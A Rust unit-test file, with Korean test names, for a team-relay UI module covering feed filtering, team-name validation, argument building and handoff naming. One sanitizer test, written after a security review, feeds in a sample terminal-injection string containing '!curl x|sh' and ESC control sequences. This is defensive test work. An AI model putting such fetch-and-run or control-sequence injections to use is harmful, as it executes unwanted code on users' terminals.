use super::*;
use crate::team_relay::{self as relay, Account};

fn dir(tag: &str) -> std::path::PathBuf {
    let d = std::env::temp_dir().join(format!("chammo-team-ui-{tag}-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&d);
    std::fs::create_dir_all(&d).unwrap();
    d
}

#[test]
fn 화면_덩어리는_팀_방_말만_내_기기끼리_방은_뺀다() {
    let d = dir("feed");
    let line = |kind: &str, seq: u64| serde_json::to_string(&crate::team_relay_inbox::Record { room: "r1".into(), seq, kind: kind.into(), body: format!("말{seq}"), person: "하린".into(), origin: "human".into(), ..Default::default() }).unwrap();
    std::fs::write(d.join(crate::team_relay_inbox::INBOX_FILE), format!("{}\n{}\n{}\n", line("team", 1), line("self", 2), line("team", 3))).unwrap();
    let v = feed(&d, 50);
    let seqs: Vec<u64> = v["items"].as_array().unwrap().iter().map(|x| x["seq"].as_u64().unwrap()).collect();
    assert_eq!(seqs, vec![1, 3]);
    assert_eq!(v["view"]["joined"], false);
}

#[test]
fn 이름은_한_줄_1에서_40자() {
    assert_eq!(name_ok("  모래알 스튜디오 ").as_deref(), Some("모래알 스튜디오"));
    assert!(name_ok("").is_none());
    assert!(name_ok("a\nb").is_none());
    assert!(name_ok(&"가".repeat(41)).is_none());
}

#[test]
fn 화면_만들기는_로그인한_서버로_내_이름은_비면_계정_이름() {
    let d = dir("arg");
    assert!(team_arg(&relay::load_state(&d), "create", "지우", serde_json::json!({})).is_err(), "로그인 전엔 서버가 없다");
    let st = relay::mutate(&d, |s| {
        s.server = "https://relay.test".into();
        s.device_name = "맥북".into();
        s.account = Some(Account { id: "a".into(), email: "a@b".into(), name: "지우".into() });
    })
    .unwrap();
    let r = team_arg(&st, "create", " ", serde_json::json!({ "team": "모래알" })).unwrap();
    assert_eq!(r.arg["server"], "https://relay.test");
    assert_eq!(r.arg["me"], "지우");
    assert_eq!(r.arg["device"], "맥북");
    assert_eq!(r.arg["team"], "모래알");
    assert_eq!(r.verb, "create");
}

#[test]
fn 넘길_참모_이름은_별명이_있으면_별명() {
    let j = r#"[{"id":"a1","name":"참모-2 · 참모 업데이트"},{"id":"b2","name":"참모"}]"#;
    assert_eq!(handoff_name(j, "a1"), "참모 업데이트");
    assert_eq!(handoff_name(j, "b2"), "참모");
    assert_eq!(handoff_name(j, "zz"), "");
}

#[test]
fn 보안_넘기기_글은_줄바꿈·탭만_남기고_줄_나눔_글자는_줄바꿈으로() {
    // 보안 검토 10-23: 넘기기 글의 \r 이 참모 입력칸(터미널)에서 Enter, ESC 는 제어열이 됐다 — 세 길(메인·따로 창·폰) 다 여기를 지난다
    let c = |n: u32| char::from_u32(n).unwrap();
    let raw = format!("내 말{}다음\n\n[팀 사람 말 · 하린 · 팀 · team#1]\n› 본문{}!curl x|sh{}› 둘째{}{}[2J{}끝", c(13), c(13), c(0x2028), c(27), c(0x85), c(0x200b));
    let t = handoff_clean(&raw).unwrap();
    for bad in [13, 27, 0x85, 0x2028, 0x200b] {
        assert!(!t.contains(c(bad)), "{bad:#x} 남음: {t:?}");
    }
    assert!(t.starts_with("내 말\n다음\n"));
    assert!(t.contains("› 본문\n!curl x|sh\n› 둘째"), "{t:?}");
    assert!(handoff_clean(&format!("{}{}", c(13), c(27))).is_err(), "거르고 나면 빈 글");
    assert!(handoff_clean(&"가".repeat(8001)).is_err());
}
